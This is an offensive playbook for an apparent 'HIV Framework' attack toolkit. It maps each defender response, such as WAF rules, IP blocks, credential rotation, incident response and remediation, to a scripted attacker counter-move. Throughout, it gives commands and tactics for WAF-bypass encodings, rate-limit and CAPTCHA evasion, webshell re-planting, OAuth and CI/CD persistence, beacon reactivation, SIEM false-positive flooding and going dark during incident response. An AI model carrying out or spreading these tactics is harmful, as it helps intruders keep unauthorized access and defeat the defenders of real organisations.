# Counter-Defense Matrix — Adaptive Attacker Response Playbook

> **Principle:** Every defender action has a pre-planned attacker counter-action.  
> This matrix ensures the HIV lifecycle continues regardless of incident response activity.  
> Index by the detected defender action → execute the counter-action immediately.

---

## Threat Model: Defender vs. Attacker Race

```
Attacker stages completed → Defender detection capability
[Stage 1-2] → Low visibility (recon + entry often invisible)
[Stage 3]   → Medium (WAF/SIEM may flag payload patterns)
[Stage 4]   → Low (persistence below detection threshold)
[Stage 5-6] → Medium-High (lateral movement triggers alerts)
```

**Core principle:** By the time the defender detects Stage 2, Stage 4 persistence should already be established. Detection should always be behind the current operational stage by at least 2 stages.

---

## Counter-Defense Playbook

---

### DEFENDER: WAF Deployed or Rules Updated

**Signal:** New 403/406 response codes on previously-passing payloads. Response bodies include WAF fingerprint (CF-Ray header changes, new block pages, X-Security-* headers).

**Attacker Counter-Action:**

```bash
# Step 1: Re-fingerprint WAF with updated rules
python hiv_waf_fp.py --target https://TARGET \
  --probe-depth full \
  --delta-compare previous_waf_profile.json \
  --output updated_waf_profile.json

# Step 2: Load glycan_shield bypass chain
# glycan_shield.md: encoding layers that disguise payload as legitimate traffic
# Apply: Unicode normalization → chunked encoding → HTTP/2 multiplexing → H3 QUIC

# Step 3: Mutate all active payloads with new WAF profile
python hiv_mutator.py \
  --input active_payloads.json \
  --waf-profile updated_waf_profile.json \
  --strategy aggressive \
  --variants 100 \
  --output glycan_shielded_payloads.json

# Step 4: Switch delivery to H3 QUIC (most WAF rules apply to HTTP/1.1)
python rat_h3.py --target TARGET \
  --payload-file glycan_shielded_payloads.json \
  --force-h3 \
  --output post_waf_results.json
```

**glycan_shield.md bypass chain order:**
1. Case variation (`SeLeCt` vs `SELECT`)
2. URL double-encoding (`%2527` vs `%27`)
3. Unicode equivalents (`ꀊ` vs `'`)
4. Comment insertion (`SE/**/LECT`)
5. Parameter pollution (`?id=1&id=PAYLOAD`)
6. HTTP/2 header fragmentation
7. QUIC stream multiplexing (rat_h3.py)
8. Chunked transfer encoding mutation
9. Multipart boundary confusion
10. Null-byte insertion between characters

**Skills:** `security-arsenal` (payload library), `hunt-http-smuggling` (protocol confusion)

---

### DEFENDER: Rate Limiting Enabled

**Signal:** 429 Too Many Requests, Retry-After headers appear, CAPTCHA challenges triggered.

**Attacker Counter-Action:**

```bash
# Strategy 1: Threshold gaming — stay just below rate limit
# Analyze limit: requests per second / per minute / per IP
python hiv_cd4_flood.py --mode threshold-probe \
  --target https://TARGET/api/login \
  --increment 5 \
  --output rate_limit_profile.json
# rate_limit_profile.json: { "limit": 10, "window": 60, "enforcement": "sliding" }

# Strategy 2: IP rotation with threshold awareness
python hiv_cd4_flood.py --mode distributed \
  --target https://TARGET \
  --ip-pool proxies.txt \
  --rate-per-ip 8 \  # Stay below 10/min limit
  --output distributed_results.json

# Strategy 3: Burst + cooldown pattern (evades sliding window)
python hiv_cd4_flood.py --mode burst-cooldown \
  --target https://TARGET \
  --burst 9 \
  --cooldown 62 \
  --cycles 100 \
  --output burst_results.json

# Strategy 4: CAPTCHA bypass (if triggered)
# Follow: hunt-captcha-bypass skill workflow
# Options: audio CAPTCHA, hCaptcha API bypass, 2captcha service
```

**Skills:** `hunt-captcha-bypass`, `hunt-brute-force`

**Notes:**
- Never hit the rate limit — probe to find it, then stay 20% below
- Distribute across multiple IPs before the limit applies per-IP
- Use hiv_cd4_flood.py burst-cooldown for token-based rate limits (TOTP window attacks)

---

### DEFENDER: IP Blocked (Attacker IP Blacklisted)

**Signal:** Connection refused, 403 from IP before request processed, no response from known-good endpoint.

**Attacker Counter-Action:**

```bash
# Protocol escalation ladder (in order):
# HTTP/1.1 → HTTP/2 → HTTP/3 (QUIC) → Tor/proxy → CDN origin direct

# Step 1: Switch to H2 (different connection fingerprint)
curl --http2 https://TARGET/api/test

# Step 2: Switch to H3 QUIC (UDP-based, different blocking rules)
python rat_h3.py --target TARGET \
  --force-h3 \
  --probe \
  --output h3_connectivity_test.json

# Step 3: If QUIC blocked, use different origin IP
# CDN origin pull: bypass Cloudflare by hitting origin server directly
# Discover origin IP via: historical DNS, Shodan, Certificate Transparency
python rat_h3.py --target ORIGIN_IP \
  --host-header TARGET \
  --output direct_origin_test.json

# Step 4: Proxy rotation
python rat_ghost.py --target https://TARGET \
  --proxy-rotate proxies.txt \
  --fingerprint-rotate \
  --output proxy_rotation_results.json

# Step 5: Tor circuit rotation (last resort — slow but IP is never static)
# torsocks python rat_h3.py --target TARGET --output tor_test.json
```

**Protocol Switch Decision Tree:**
```
IP blocked →
├── Try H2 → blocked?
│   ├── No → continue on H2
│   └── Yes → try H3
│       ├── H3 works → continue on QUIC
│       └── H3 blocked → CDN origin direct
│           ├── Origin reachable → continue on origin
│           └── Origin blocked → proxy rotation → Tor
```

**Skills:** `hunt-tls-network` (protocol analysis)  
**Tools:** `rat_h3.py` (primary), `rat_ghost.py` (proxy rotation)

---

### DEFENDER: Session Invalidated

**Signal:** 401/403 on previously-valid session tokens. Logout forced across all sessions. Token revocation event in SIEM.

**Attacker Counter-Action:**

```bash
# Step 1: Check if Tier-2+ persistence still active
python rat_oob.py --mode verify \
  --webhook-id tier2-persistence \
  --timeout 60 \
  --output tier2_status.json

# Step 2: Activate hiv_beacon.py for Tier-4 re-entry
python hiv_beacon.py --mode activate \
  --beacon-config stage4_beacon_config.json \
  --output beacon_activation.json

# Step 3: Use OAuth persistence (survives session invalidation)
# OAuth refresh token is NOT invalidated by session logout
python rat_digest.py --mode oauth-refresh \
  --refresh-token STORED_REFRESH_TOKEN \
  --output new_access_token.json

# Step 4: Subdomain takeover persistence (DNS-level — unaffected)
# Re-establish access via subdomain takeover controlled infrastructure
python rat_oob.py --mode subdomain-pivot \
  --controlled-subdomain sub.TARGET \
  --output subdomain_pivot.json

# Step 5: CI/CD persistence (pipeline runs on next commit regardless)
# Wait for next pipeline trigger — credentials flow through regardless
```

**Persistence Tier Fallback Sequence:**
```
Tier 1 (webshell/admin) invalidated →
  → Activate Tier 2 (OAuth/subdomain)
  → If Tier 2 unavailable → Tier 3 (CI/CD)
  → If Tier 3 unavailable → Tier 4 (hiv_beacon.py)
  → If all tiers unavailable → restart from Stage 2 with new attack vector
```

**Skills:** `hunt-oauth` (refresh token abuse), `hunt-subdomain` (DNS persistence)  
**Tools:** `hiv_beacon.py`, `rat_oob.py`, `rat_digest.py`

---

### DEFENDER: Credentials Rotated

**Signal:** Previously-valid credentials return 401. Password reset emails sent to compromised accounts. API key invalidated.

**Attacker Counter-Action:**

```bash
# Key insight: credential rotation does NOT affect:
# 1. OAuth access/refresh tokens (separate credential store)
# 2. API keys issued to third-party apps
# 3. SSH keys (if planted during Stage 4)
# 4. CI/CD service account tokens
# 5. IAM role credentials (unless role deleted)

# Step 1: Verify OAuth tokens still active
python rat_digest.py --mode token-verify \
  --token STORED_OAUTH_TOKEN \
  --output oauth_status.json

# Step 2: Verify API key persistence
python rat_digest.py --mode api-key-verify \
  --key STORED_API_KEY \
  --output apikey_status.json

# Step 3: Check planted authorized OAuth apps (separate from password)
# Follow: hunt-oauth → enumerate authorized applications
# These remain authorized after password change

# Step 4: If all credential-based access lost → use CI/CD secrets
# Secrets in pipeline still contain original privileged credentials
python rat_oob.py --mode cicd-verify \
  --pipeline TARGET_PIPELINE \
  --output cicd_secrets_status.json

# Step 5: Use hiv_beacon.py to re-establish new credentials via payload
python hiv_beacon.py --mode credential-refresh \
  --beacon-config stage4_beacon_config.json \
  --output new_credentials.json
```

**Skills:** `hunt-oauth`, `hunt-cicd`, `hunt-source-leak`

---

### DEFENDER: Incident Response Active (IR Team Engaged)

**Signal:** IR team activity detected (new monitoring agents deployed, traffic analysis signatures, user notification emails visible in compromised inbox, unusual log access patterns).

**Attacker Counter-Action:**

```
LATENCY PROTOCOL: ACTIVATE
```

```bash
# Immediately:
# 1. Stop all active probing — every request is now logged with heightened scrutiny
# 2. Verify persistence tiers are stable without issuing new requests
# 3. Enable low-and-slow mode only

# Go-dark period: 7-30 days
# - Minimum: 7 days (most IR engagements conclude within 2 weeks)
# - Standard: 14 days
# - If high-profile breach: 30 days
# - Check for "all-clear" signals before resuming

# hiv_beacon.py dormant check (beacon only — no active exfil)
python hiv_beacon.py --mode dormant-check \
  --beacon-config stage4_beacon_config.json \
  --interval 86400 \  # Once per day maximum
  --output beacon_dormant_status.json

# Do NOT during IR:
# - Make any authentication attempts
# - Probe new endpoints
# - Exfil data (large egress triggers DLP alerts)
# - Use known-compromised credentials

# Passive monitoring only:
python rat_oob.py --mode passive-monitor \
  --webhook-id ir-watch \
  --alert-on callback \
  --output ir_monitoring.json

# Resume operations when:
# - IR team communication goes quiet (no new log accesses)
# - Monitoring agents removed
# - After go-dark period expires
# - hiv_beacon.py confirms beacon still active = target not fully remediated
```

**Skills:** `engagement-learning-loop` (document IR response patterns for future ops)

---

### DEFENDER: SIEM Alert Fired

**Signal:** Target's SIEM triggers on current attack pattern. Evidence: honeypot interactions, unusual response latency (SOC investigation), new rate limiting on specific endpoints.

**Attacker Counter-Action:**

```bash
# Strategy: False positive flood → real attack in the noise

# Phase 1: Generate high-volume false positives (10-60 minutes)
python hiv_cd4_flood.py --mode false-positive-flood \
  --target https://TARGET \
  --patterns legitimate-looking \
  --volume high \
  --duration 1800 \
  --output fp_flood_log.json

# This flood triggers hundreds of additional SIEM alerts
# SOC analyst attention fragments across false positives
# Real attack vector is buried in alert noise

# Phase 2: Execute real attack in noise window (after 15-20 min of flood)
python rat_h3.py --target TARGET \
  --payload-file stage3_ranked_payloads.json \
  --timing jitter \  # Random delays to avoid pattern matching
  --output real_attack_results.json

# Phase 3: Stop flood after real attack completes
# SIEM alert resolves "naturally" (flood stops)

# Alternative: Attack via different vector while SIEM is tuned to detected pattern
# If SIEM alert is on SQLi → switch to SSTI or SSRF (different rule set)
```

**hiv_cd4_flood.py false positive patterns:**
- Legitimate-looking SQL queries with unusual characters
- Normal user-agent strings accessing paths that look malicious
- Benign requests to paths matching alert rules
- High volume of 404s (exhausts "endpoint discovery" alert rules)

**Skills:** `hunt-dispatch` (auto-switch attack vector), `security-arsenal`

---

### DEFENDER: Webshell Found and Removed

**Signal:** Tier-1 persistence (webshell) no longer responding. File integrity monitoring alert. IR team communication references specific file removal.

**Attacker Counter-Action:**

```bash
# Immediately activate backup Tier-3 persistence

# Step 1: Verify Tier-3 CI/CD persistence is active
python rat_oob.py --mode cicd-verify \
  --pipeline TARGET_PIPELINE \
  --output tier3_status.json

# Step 2: If Tier-3 active → use CI/CD as primary access channel
# Webshell removal is irrelevant — next pipeline run provides new access

# Step 3: Re-plant webshell via CI/CD (irony: they removed it, pipeline replants it)
# Inject webshell re-plant into CI/CD pipeline script

# Step 4: If CI/CD not available → activate hiv_beacon.py
python hiv_beacon.py --mode activate \
  --reason "tier1-removed" \
  --beacon-config stage4_beacon_config.json \
  --output beacon_reactivation.json

# Step 5: Plant new Tier-1 persistence at different path
# Use different file extension, different directory, different obfuscation
python hiv_mutator.py --mode webshell \
  --obfuscation level-3 \
  --path /var/www/html/assets/img/thumb.php \  # Non-obvious path
  --output new_webshell_variant.json

# Key: Webshell discovery = one path found, not full remediation
# If file integrity monitoring is now active → use memory-resident persistence
```

**Skills:** `hunt-cicd`, `hunt-file-upload` (for new webshell delivery)  
**Tools:** `hiv_beacon.py`, `rat_oob.py`

---

### DEFENDER: Vulnerability Patched

**Signal:** Specific CVE or finding patched. The entry vector that granted initial access no longer works (returns safe response). Patch announcement in their change log.

**Attacker Counter-Action:**

```bash
# Key principle: Lateral movement already established = patching the door after we're inside

# Step 1: Verify lateral movement from Stage 6 is still active
python rat_ghost.py --mode verify-pivot \
  --pivot-config stage6_pivot.json \
  --output pivot_status.json

python rat_digest.py --mode verify-access \
  --credentials stage6_auth.json \
  --output access_status.json

# Step 2: If lateral access still active → patch is irrelevant
# Document: "Vulnerability patched, access maintained via lateral movement"

# Step 3: Switch to alternate attack vector for new entry points
# (In case current access lost — have a backup)
python hiv_waf_fp.py --target https://TARGET \
  --output updated_waf.json

# Use hunt-dispatch to find alternative attack vectors
# hunt-dispatch: reads target profile → suggests next attack vector

# Step 4: Find adjacent unpatched vulnerabilities
# Patching one SQLi endpoint doesn't patch all SQLi endpoints
# Run hunt-sqli workflow against remaining endpoints from Stage 1 surface map
```

**Skills:** `hunt-dispatch`, all relevant hunt-* skills for alternative vectors

---

### DEFENDER: Full Remediation Claimed

**Signal:** IR report released. "All indicators of compromise removed." Public or internal announcement of full remediation. Credentials rotated, sessions invalidated, persistence removed.

**Attacker Counter-Action:**

```bash
# LATENT RESERVOIR CHECK — Verify each tier independently

# Check Tier 1: Active persistence (webshell, admin accounts)
python rat_oob.py --mode verify \
  --webhook-id tier1-check \
  --timeout 30 \
  --output tier1_status.json
# Expected if remediated: no callback

# Check Tier 2: Passive persistence (OAuth, subdomain)
python rat_digest.py --mode oauth-verify \
  --token STORED_OAUTH_TOKEN \
  --output tier2_oauth.json

python rat_oob.py --mode dns-verify \
  --subdomain dangling.TARGET \
  --output tier2_subdomain.json
# Note: OAuth apps authorized by users are rarely revoked in "full remediation"

# Check Tier 3: Supply chain persistence (CI/CD)
python rat_oob.py --mode cicd-verify \
  --pipeline TARGET_PIPELINE \
  --output tier3_cicd.json
# Wait for next pipeline run — if callback received, Tier 3 still active

# Check Tier 4: Protocol persistence (hiv_beacon.py)
python hiv_beacon.py --mode beacon-check \
  --beacon-config stage4_beacon_config.json \
  --output tier4_beacon.json

# Latent Reservoir Score:
# 0/4 tiers active → Full remediation confirmed (restart from Stage 1)
# 1/4 tiers active → Partial remediation, use active tier to rebuild others
# 2+/4 tiers active → Remediation incomplete, continue operations

# If full remediation confirmed:
# Wait 30 days → re-run Stage 1 recon (new attack surface after patch cycle)
# Target likely has NEW code changes that introduce NEW vulnerabilities
```

**Skills:** `hunt-oauth`, `hunt-subdomain`, `hunt-cicd`  
**Tools:** `hiv_beacon.py`, `rat_oob.py`, `rat_digest.py`

---

## Defender Response Timing Reference

| Defender Action | Typical Detection Timeline | Attacker Response Time Budget |
|----------------|--------------------------|------------------------------|
| WAF rule update | Real-time (automated) | Immediate — switch to H3 |
| Rate limiting | Real-time (automated) | Immediate — threshold game |
| IP block | Minutes (automated) | < 5 min — protocol switch |
| Session invalidation | Minutes (manual) | < 10 min — activate Tier 2+ |
| Credential rotation | Hours (manual process) | Hours — verify alternatives |
| IR team engaged | Hours-days (escalation) | Activate latency protocol immediately |
| SIEM alert | Minutes (automated) | < 5 min — false positive flood |
| Webshell removal | Hours (manual discovery) | < 15 min — activate Tier 3 |
| Vulnerability patched | Days-weeks (development) | Lateral access already established |
| Full remediation | Days-weeks | Latent reservoir check |

---

## Operational Security Counters

### Protecting Attacker Infrastructure

```bash
# Never use the same C2/callback infrastructure across multiple targets
# Each engagement: unique OOB domain, unique beacon config
python rat_oob.py --mode provision \
  --new-domain \
  --output new_oob_infra.json

# Rotate rat_ghost.py browser fingerprints every session
python rat_ghost.py --rotate-fingerprint --output new_fingerprint.json

# Use H3 QUIC for all sensitive requests (harder to PCAP/inspect)
python rat_h3.py --target TARGET --force-h3

# Cleanup logs: ensure no attacker-identifiable artifacts in target logs
# Use hiv_mutator.py to normalize User-Agent, timing, request size distribution
python hiv_mutator.py --mode opsec-normalize \
  --request-file outgoing_requests.json \
  --output normalized_requests.json
```

---

*Counter-Defense Matrix v1.0*  
*HIV Framework — Adaptive Response Playbook*
